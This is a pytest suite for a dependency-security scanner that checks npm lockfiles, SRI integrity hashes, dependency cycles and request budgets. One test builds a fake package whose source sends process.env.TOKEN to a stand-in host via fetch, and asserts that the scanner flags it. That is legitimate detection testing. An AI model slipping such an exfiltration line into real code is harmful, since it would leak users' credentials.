import base64
import hashlib
import io
import json
import tarfile
import time
import pytest
from backend.guardian.config import Budget
from backend.guardian.dependencies import RegistrySession, inspect_dependencies, lock_graph, BudgetExceeded
from backend.guardian.integrity import verify
from backend.guardian.engine import analyze
from backend.guardian import ingestion

def sri(data, algorithm='sha512'):
    return algorithm+'-'+base64.b64encode(hashlib.new(algorithm,data).digest()).decode()

def tarball(name='alpha', version='1.0.0', source='export const ok=1;'):
    out=io.BytesIO()
    with tarfile.open(fileobj=out,mode='w:gz') as tar:
        for name,content in [('package/package.json',json.dumps({'name':name,'version':version})),('package/index.js',source)]:
            raw=content.encode();entry=tarfile.TarInfo(name);entry.size=len(raw);tar.addfile(entry,io.BytesIO(raw))
    return out.getvalue()

def graph(entries=None):
    return {'package-lock.json':json.dumps({'name':'project','lockfileVersion':3,'packages':{'':{'dependencies':{'alpha':'1.0.0'}},**(entries or {'node_modules/alpha':{'version':'1.0.0'}})}})}

def registry(monkeypatch, data):
    urls=[]
    def download(url,limit=ingestion.MAX_UPLOAD,timeout=15):
        urls.append(url)
        if '/-/' in url:
            name=url.split('/')[3];raw=data[name]
            if len(raw)>limit:raise ValueError('download limit')
            return raw
        name=url.split('/')[3];raw=data[name]
        return json.dumps({'name':name,'version':'1.0.0','dist':{'tarball':f'https://registry.npmjs.org/{name}/-/{name}-1.0.0.tgz','integrity':sri(raw)}}).encode()
    monkeypatch.setattr(ingestion,'download',download)
    return urls

@pytest.mark.parametrize('algorithm',['sha512','sha1','sha256','sha384'])
def test_integrity_supported_algorithms(algorithm):
    result=verify(b'package',sri(b'package',algorithm))
    assert result.status=='verified' and result.computed==[result.expected]

@pytest.mark.parametrize('value,status',[(None,'missing'),('','missing'),('sha999-YWJj','unsupported'),('sha512-nope','invalid'),('not sri','invalid'),(12,'invalid'),('  ','invalid')])
def test_integrity_missing_invalid_unsupported(value,status):
    assert verify(b'package',value).status==status

def test_strongest_sri_cannot_fall_back_to_weak_match():
    assert verify(b'package',sri(b'wrong','sha512')+' '+sri(b'package','sha1')).status=='mismatch'

def test_integrity_mismatch_prevents_extraction(monkeypatch):
    raw=tarball();registry(monkeypatch,{'alpha':raw})
    monkeypatch.setattr(ingestion,'archive',lambda *a:pytest.fail('Unverified bytes must not be extracted'))
    result=RegistrySession().retrieve('alpha','1.0.0',sri(b'wrong'))
    assert result.integrity.status=='mismatch' and result.files=={}
    assert result.integrity.computed==[sri(raw)]

def test_missing_lock_integrity_distinct_from_registry_verified(monkeypatch):
    raw=tarball();registry(monkeypatch,{'alpha':raw})
    result=RegistrySession().retrieve('alpha','1.0.0')
    assert result.integrity.status=='missing'
    assert result.registry_integrity.status=='verified'
    assert result.files

def test_transitive_dependency_source_finding_and_dedup(monkeypatch):
    a=tarball();b=tarball('beta',source='fetch("https://example.invalid",{body:process.env.TOKEN});')
    urls=registry(monkeypatch,{'alpha':a,'beta':b})
    files=graph({'node_modules/alpha':{'version':'1.0.0','integrity':sri(a),'dependencies':{'beta':'1.0.0'}},'node_modules/beta':{'version':'1.0.0','integrity':sri(b)}})
    nodes,summary,findings,warnings,count=inspect_dependencies(files,analyze)
    assert summary.total==2 and summary.direct==1 and summary.transitive==1 and summary.inspected==2
    assert len(urls)==4
    assert any(f.rule=='SENSITIVE_TRANSMISSION' and f.package=='beta@1.0.0' for f in findings)
    assert nodes[1].integrity.status=='verified'
    assert all(e.file.startswith('dependencies/') for f in findings for e in f.evidence)

def test_cycle_terminates_and_downloads_once(monkeypatch):
    a=tarball();b=tarball('beta');urls=registry(monkeypatch,{'alpha':a,'beta':b})
    files=graph({'node_modules/alpha':{'version':'1.0.0','dependencies':{'beta':'1.0.0'}},'node_modules/beta':{'version':'1.0.0','dependencies':{'alpha':'1.0.0'}}})
    nodes,summary,_,warnings,_=inspect_dependencies(files,analyze)
    assert summary.inspected==2 and len(urls)==4
    assert any('cyclic' in w for w in warnings)

def test_nearest_nested_version_and_package_download_reuse(monkeypatch):
    a=tarball();b=tarball('beta');urls=registry(monkeypatch,{'alpha':a,'beta':b})
    files=graph({'node_modules/alpha':{'version':'1.0.0','dependencies':{'beta':'1.0.0','alpha':'1.0.0'}},'node_modules/alpha/node_modules/beta':{'version':'1.0.0'},'node_modules/alpha/node_modules/alpha':{'version':'1.0.0'}})
    nodes,summary,_,_,_=inspect_dependencies(files,analyze)
    assert summary.inspected==3 and len(urls)==4
    assert nodes[0].dependencies[0]=='node_modules/alpha/node_modules/beta'

def test_depth_limit_keeps_uninspected_explicit(monkeypatch):
    a=tarball();b=tarball('beta');registry(monkeypatch,{'alpha':a,'beta':b})
    files=graph({'node_modules/alpha':{'version':'1.0.0','dependencies':{'beta':'1.0.0'}},'node_modules/beta':{'version':'1.0.0'}})
    session=RegistrySession(Budget(depth=1))
    nodes,summary,_,warnings,_=inspect_dependencies(files,analyze,session=session)
    assert summary.inspected==1 and summary.skipped==1
    assert nodes[1].status=='skipped'
    assert any('incomplete' in w for w in warnings)

def test_package_budget_zero(monkeypatch):
    nodes,summary,_,_,_=inspect_dependencies(graph(),analyze,session=RegistrySession(Budget(packages=0)))
    assert summary.skipped==1 and summary.registry_requests==0

def test_unavailable_dependency_is_never_safe():
    nodes,summary,_,warnings,_=inspect_dependencies(graph(),analyze)
    assert nodes[0].status=='unavailable' and summary.unavailable==1

def test_integrity_failure_has_separate_domain(monkeypatch):
    a=tarball();registry(monkeypatch,{'alpha':a})
    nodes,summary,findings,_,_=inspect_dependencies(graph({'node_modules/alpha':{'version':'1.0.0','integrity':sri(b'wrong')}}),analyze)
    assert summary.inspected==0 and nodes[0].status=='integrity_failed'
    assert findings[0].domain=='integrity'

def test_request_and_download_budget(monkeypatch):
    raw=tarball();registry(monkeypatch,{'alpha':raw})
    with pytest.raises(BudgetExceeded):RegistrySession(Budget(requests=1)).retrieve('alpha','1.0.0')
    with pytest.raises((ValueError,BudgetExceeded)):RegistrySession(Budget(bytes=1)).retrieve('alpha','1.0.0')

def test_elapsed_budget(monkeypatch):
    session=RegistrySession(Budget(seconds=1));session.started-=2
    with pytest.raises(BudgetExceeded):session.retrieve('alpha','1.0.0')

def test_unresolved_and_workspace_entries():
    nodes,_,warnings=lock_graph(graph({'node_modules/alpha':{'link':True,'resolved':'../alpha'}}))
    assert nodes[0].status=='unresolved'
    nodes,_,warnings=lock_graph({'package.json':'{"dependencies":{"alpha":"^1.0.0"}}'})
    assert nodes[0].status=='unresolved' and warnings
